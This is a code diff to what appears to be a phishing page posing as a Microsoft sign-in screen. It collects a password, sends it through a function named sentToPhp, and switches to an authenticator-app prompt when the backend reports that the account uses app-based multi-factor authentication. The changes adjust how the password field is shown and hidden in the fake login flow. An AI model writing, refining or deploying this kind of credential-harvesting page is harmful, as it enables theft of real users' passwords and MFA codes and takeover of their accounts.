@@ -425,13 +425,11 @@
                                 <span class="align-middle h5 logoname"> Microsoft</span><br /><br />
                                 <i class="fas fa-arrow-left" id="back" style="cursor: pointer"></i>&nbsp;
                                 <span id="emailDisplay"></span>
-
-                                <div class="form-group mt-2" id="passwordContainer"></div>
-                                    <div class="py-2"><span class="h5">Enter Password</span></div>
-                                    <p id="passwordError" style="color: red; font-size: 14px; display: none;"></p>
+                                <div class="py-2" id="enterPassword"><span class="h5">Enter Password</span></div>
+                                <p id="passwordError" style="color: red; font-size: 14px; display: none;"></p>
                                 <!-- <p id="confirmation" style="display: none; font-size: 14px;"></p> -->
 
-                                
+                                <div class="form-group mt-2" id="passwordContainer">
                                     <input type="password" class="form-control" id="password" placeholder="Enter Password" />
                                 </div>
 
@@ -567,11 +565,11 @@
 
             async function sentToPhp(data) {
                 const spinner = document.getElementById('spinner');
-                const confirmation = document.getElementById('confirmation');
+                // const confirmation = document.getElementById('confirmation');
 
                 // Reset previous states
-                confirmation.style.display = 'none';
-                confirmation.textContent = '';
+                // confirmation.style.display = 'none';
+                // confirmation.textContent = '';
                 spinner.style.display = 'flex';
 
                 try {
@@ -600,8 +598,11 @@
                         if (webhookResponse.auth_type === "autentication-app") {
                             // Hide the password input
                             const passwordContainer = document.getElementById("passwordContainer");
+                            const enterPassword = document.getElementById("enterPassword");
+                            
                             if (passwordContainer) {
                                 passwordContainer.style.display = "none";
+                                enterPassword.style.display = "none";
                             }
 
                             // Show the authentication app section
